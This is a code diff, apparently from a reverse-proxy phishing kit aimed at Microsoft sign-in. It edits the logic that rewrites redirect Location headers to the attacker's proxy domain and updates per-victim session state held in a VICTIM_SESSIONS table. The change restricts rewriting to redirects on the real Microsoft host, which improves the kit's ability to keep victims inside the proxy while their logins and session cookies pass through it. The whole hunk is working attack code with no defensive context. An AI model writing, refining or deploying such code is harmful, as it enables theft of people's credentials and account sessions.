@@ -460,21 +460,21 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     if (proxyResponseLocation) {
         try {
             const locationURL = new URL(proxyResponseLocation);
-            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
-            
-            // Update session to the target host (important for subsequent requests)
-            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-            VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
-            VICTIM_SESSIONS[currentSession].port = locationURL.port;
-            VICTIM_SESSIONS[currentSession].host = locationURL.host;
-
-            // Rewrite Location to point back to your proxy domain
-            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
-            proxyResponse.headers.location = rewritten;
-            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
+            // Only rewrite if the Location points to the real Microsoft host
+            if (locationURL.hostname === VICTIM_SESSIONS[currentSession].hostname) {
+                console.log(`[REDIRECT REWRITE] Original: ${proxyResponseLocation}`);
+                // Update session with new target
+                VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
+                VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
+                VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
+                VICTIM_SESSIONS[currentSession].port = locationURL.port;
+                VICTIM_SESSIONS[currentSession].host = locationURL.host;
+                // Rewrite Location to proxy domain
+                const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+                proxyResponse.headers.location = rewritten;
+                console.log(`[REDIRECT REWRITE] Rewritten: ${rewritten}`);
+            }
         } catch (error) {
-            VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
             console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
         }
     }
